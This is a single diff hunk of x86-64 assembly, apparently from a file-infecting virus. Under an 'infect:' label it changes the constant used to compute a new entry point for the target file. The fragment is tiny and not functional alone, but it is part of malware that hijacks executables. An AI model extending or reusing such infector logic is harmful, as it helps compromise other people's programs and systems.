@@ -209,7 +209,7 @@ infect:
 
     ; Change the entry point to somewhere very far
     xor rax, rax
-    or rax, 0xc000000
+    or rax, 0xF00000
     add rax, [file_size]
     mov [rsi + 16], rax
 
